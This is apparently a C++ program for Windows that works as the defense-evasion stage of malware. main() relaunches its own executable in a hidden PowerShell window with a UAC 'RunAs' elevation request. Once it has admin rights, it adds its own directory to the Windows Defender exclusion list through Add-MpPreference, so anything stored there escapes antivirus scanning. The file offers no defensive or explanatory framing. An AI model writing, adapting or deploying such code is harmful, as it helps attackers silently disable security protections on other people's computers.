#include <string>
#include <windows.h>
#include <filesystem>

using namespace std;

class Commander {
    FILE* commander;
    const char* mode; 
  public:
    Commander(const char* mode = "r") : commander{NULL}, mode{mode} {}

    void exec(const char* command) {
        if (commander) pclose(commander);
        this->commander = popen(command, this->mode);
    }

    void exec(string command) {
        if (commander) pclose(commander);
        this->commander = popen(command.c_str(), this->mode);
    }

    string result() {
        if (!commander) {
            throw "You must run a command before you can run result()";
        }
        string result;
        try {
            char buffer[128];
            while (fgets(buffer, sizeof(buffer), this->commander)) {
                result += buffer;
            }
        } catch (...) {
            pclose(this->commander);
            throw "Something went wrong while reading the commander";
        }
        return result;
    }
};

bool isAdmin() {
    bool isElevated = false;
    HANDLE handle = NULL;
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &handle)) {
        TOKEN_ELEVATION elevation;
        DWORD returnLength = sizeof(TOKEN_ELEVATION);

        // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
        if (GetTokenInformation(handle, TokenElevation, &elevation, sizeof(elevation), &returnLength)) {
            isElevated = elevation.TokenIsElevated;
        }
    }
    if (handle) {
        CloseHandle(handle);
    }
    return isElevated;
}

int main(int paramsCount, char** params) {
    filesystem::path curPath = params[0];
    string actualFilePath = "C:/" + static_cast<string>(filesystem::relative(filesystem::current_path(), "/cygdrive/c/"));

    string filename = static_cast<string>(curPath.filename());

    string adminRunCommand  = "powershell -NonInteractive -Command \"Start-Process .\\" + filename + ".exe -Verb RunAs\" -WindowStyle Hidden";
    string baseRunCommand  = "powershell -NonInteractive -Command \"Start-Process .\\" + filename + ".exe\" -WindowStyle Hidden";
    string addExclusionCommand = "powershell -NonInteractive -Command \" Add-MpPreference -ExclusionPath \'" + actualFilePath + "\'\"";


    Commander console;
    if (!isAdmin()) { // if we don't have admin
        // request admin control
        console.exec(adminRunCommand);
        if (console.result() != "") { // they deny admin
            // rerun the current file without admin
            console.exec(baseRunCommand);
        }
    } else {
        console.exec(addExclusionCommand);
    }

    

    
}